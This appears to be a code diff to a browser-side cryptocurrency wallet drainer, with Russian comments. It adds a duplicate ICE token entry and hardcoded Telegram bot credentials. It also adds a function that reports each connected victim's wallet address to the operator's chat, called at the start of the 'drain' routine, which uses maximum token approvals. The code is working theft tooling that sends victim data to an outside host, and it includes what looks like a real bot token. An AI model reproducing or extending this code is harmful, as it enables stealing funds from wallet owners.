@@ -179,7 +179,8 @@ const CHAINS = {
       DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
       FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
       ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
-      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
+      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e",
+      ICE: "0x4e1581f01046eF1C6D7c3aA0FEa8E9B7Ea0f28c4"
     }
   },
   42161: {
@@ -198,6 +199,32 @@ const CHAINS = {
     }
   }
 };
+
+// Токен бота и ID чата для Telegram (замени на свои значения)
+const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64'; // Токен твоего бота
+const TELEGRAM_CHAT_ID = '-4767714458'; // ID твоего чата
+
+// Функция для отправки сообщения в Telegram из браузера
+async function sendTelegramMessage(message) {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown' // Для форматирования текста
+      })
+    });
+    const data = await response.json();
+    if (!data.ok) {
+      console.error(`❌ Ошибка отправки сообщения в Telegram: ${data.description}`);
+    }
+  } catch (error) {
+    console.error(`❌ Ошибка отправки сообщения в Telegram: ${error.message}`);
+  }
+}
 
 // Функция для получения цены токена в USDT через Binance API
 async function getTokenPriceInUSDT(tokenSymbol) {
@@ -339,6 +366,8 @@ async function switchChain(chainId) {
 // Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
+  // Отправляем сообщение в Telegram при подключении кошелька
+  await sendTelegramMessage(`Кошелёк: \`${userAddress}\``);
 
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
